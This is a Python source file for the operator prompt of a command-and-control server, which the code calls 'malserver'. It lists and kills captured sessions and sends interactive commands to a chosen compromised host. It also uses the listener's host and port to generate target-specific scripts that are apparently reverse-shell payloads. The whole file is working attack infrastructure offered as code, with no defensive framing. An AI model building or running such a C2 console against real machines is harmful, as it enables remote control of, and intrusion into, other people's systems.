import argparse, sys, shlex
import ScriptMaker

class HandlerPrompt:
    def __init__(self, ms):
        self.history = []
        self.promptType = 0
        self.malserver = ms
        self.isess = None # data-type: Session
        self.inputStr = "C2 > "

    def PromptType(self, pt: int):
        if pt == -1 :
            return self.promptType
        self.promptType = pt

    def DisplaySessions(self):
        id = 0
        print("======= Sessions =======")
        for sess in self.malserver.GetSessions():
            print(f"{id} | {sess.GetSessionData().GetAddress()}")
            id = id + 1
        print("========================")

    # Custom stdout writer to not overwrite stdin
    def WriteToTerminal(self, recvStr: str):
        # Dont write incoming connections to the screen
        # while interacting with a session
        if self.PromptType(-1) == 1:
            return None
        
        # Clear the current input line
        sys.stdout.write("\033[2K\r")  # Clear line and move cursor to start
        sys.stdout.flush()

        # Print the received message
        print(recvStr)
        
        # Reprint the input prompt at the bottom
        sys.stdout.write(self.inputStr)
        sys.stdout.flush()

def ProcessCommand(handle: HandlerPrompt):
    MalServerActive = True
    cmd = ""

    while (MalServerActive):
        cmd = str(input(handle.inputStr))
        cmd_args = shlex.split(cmd)  # Properly split the string into arguments

        if cmd.lower() == "exit":
            if handle.PromptType(-1) == 0:
                # Close Down Server
                handle.malserver.ReadyShutdown()
                MalServerActive = False
            else:
                # Exit Session Prompt and Shift to C2 Prompt
                handle.PromptType(0)
                handle.inputStr = "C2 > "
        else:
            # Process the Command based on Prompt Type
            if handle.PromptType(-1) == 0:
                try:
                    if "script" not in cmd.lower():
                        # Default C2 Prompt
                        parser = argparse.ArgumentParser()
                        parser.add_argument('-s', "--sessions", action='store_true', help="")
                        parser.add_argument("-i", "--interact", type=int, help="")
                        parser.add_argument("-k", "--kill", type=int, help="")
                        parser.add_argument('-K', "--kill-all", action='store_true', help="")
                        args = parser.parse_args(cmd_args)

                        if args.kill_all:
                            # Kill All Sessions
                            print("[*] Killing All Sessions. . .")
                            handle.malserver.KillSessions()
                        else:
                            if args.interact is not None:
                                print(f"[*] Attempting to Interact with SessionID: {args.interact}")

                                if args.interact < len(handle.malserver.GetSessions()):
                                    # Set session to interact with
                                    handle.isess = handle.malserver.GetSessions()[args.interact]

                                    if len(handle.isess.TestConnection()) > 0:
                                        # Enter Interactive Session
                                        handle.inputStr = ""
                                        handle.isess.SendCommand()
                                        handle.PromptType(1)
                                    else:
                                        print(f"[-] Session | {handle.isess.GetSessionData().GetAddress()} | has Died!")
                                        handle.malserver.GetSessions()[args.interact].EndSession()
                                        handle.malserver.GetSessions().remove(handle.malserver.GetSessions()[args.interact])
                                else:
                                    handle.DisplaySessions()
                            elif args.sessions:
                                handle.DisplaySessions()
                            elif args.kill is not None:
                                print(f"[*] Attempting to Kill SessionID: {args.kill}")
                                handle.malserver.GetSessions()[args.kill].EndSession()
                                handle.malserver.GetSessions().remove(handle.malserver.GetSessions()[args.kill])
                                handle.inputStr = "C2 > "
                    else:
                        # Create a shell script based off malserver details
                        handle.PromptType(2)
                        handle.inputStr = "Script > "
                except SystemExit:
                    continue

            elif handle.PromptType(-1) == 1:
                # Captured Session Prompt : inputStr based on
                # recv buffer from client session selected
                # meaning the input() will not have text contained
                handle.inputStr = ""
                handle.isess.SendCommand(cmd)
            elif handle.PromptType(-1) == 2:
                cmd_args = shlex.split(cmd)
                try:
                    parser = argparse.ArgumentParser()
                    parser.add_argument("-t", "--target", type=str, help="Executable Target OS")
                    args = parser.parse_args(cmd_args)

                    if args.target is not None:
                        # Create a shell script based off malserver details
                        if ScriptMaker.CreateScript(handle.malserver.GetLhost(),handle.malserver.GetLport(),args.target):
                            handle.inputStr = "C2 > "
                            handle.PromptType(0)
                except SystemExit:
                    continue